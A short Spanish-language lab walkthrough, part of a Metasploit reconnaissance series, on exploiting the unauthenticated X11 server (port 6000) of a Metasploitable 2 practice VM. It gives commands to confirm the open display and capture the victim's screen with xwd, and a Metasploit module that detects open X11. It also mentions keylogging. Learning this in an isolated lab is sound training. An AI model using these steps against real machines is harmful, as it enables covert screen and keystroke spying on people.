# X11 (puerto 6000) — Metasploitable 2

> Práctica de laboratorio: aplicar únicamente sobre tu propia máquina Metasploitable 2 (`192.168.100.9`), aislada de Internet. Documento de la serie [Reconocimiento y Metasploit](./01_reconocimiento_y_metasploit.md).

**Qué es:** **X11** es el sistema gráfico de Linux. Su servidor puede atender por red en el **puerto 6000**.

**Cómo se explota:** está configurado para **aceptar conexiones de cualquiera** (`xhost +`, sin autenticación). Eso permite espiar la pantalla (hacer capturas) y registrar las pulsaciones de teclado de la víctima.

## Explotación manual (sin Metasploit)

```bash
# Comprobar que el display está abierto
xwininfo -root -display 192.168.100.9:0

# Hacer una captura de la pantalla de la víctima
xwd -root -display 192.168.100.9:0 -out captura.xwd
convert captura.xwd captura.png     # para verla
```

## Explotación con Metasploit

```bash
use auxiliary/scanner/x11/open_x11
set RHOSTS 192.168.100.9
run
# detecta el X11 abierto sin autenticación
```
